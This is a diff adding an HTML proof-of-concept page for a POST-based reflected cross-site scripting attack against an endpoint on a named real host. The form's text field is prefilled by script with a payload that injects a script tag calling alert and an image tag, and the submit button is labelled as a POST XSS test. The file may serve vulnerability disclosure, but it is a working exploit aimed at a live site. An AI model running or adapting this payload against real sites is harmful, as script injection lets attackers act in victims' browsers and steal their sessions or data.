@@ -1,0 +1,22 @@
+<form method="post" action="http://gzly.cnnic.cn/cnnic_sdk/conv.jsp">
+    <input type="text" name="name">
+    <input type="submit" value="点击提交 测试POST型XSS">
+</form>
+
+<script>
+document.querySelector("input[type=text]").value = `<script>alert("xss proved")${"</sc"}ript><img width="200px" src="https://tva4.sinaimg.cn/large/007YVyKcly1h2kl9rs23cj30ma0mlk48.jpg">`
+</script>
+<style>
+form {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+}
+input[type=text] {
+    width: 50%;
+}
+input[type=submit] {
+    margin-top: 10px;
+}
+</style>
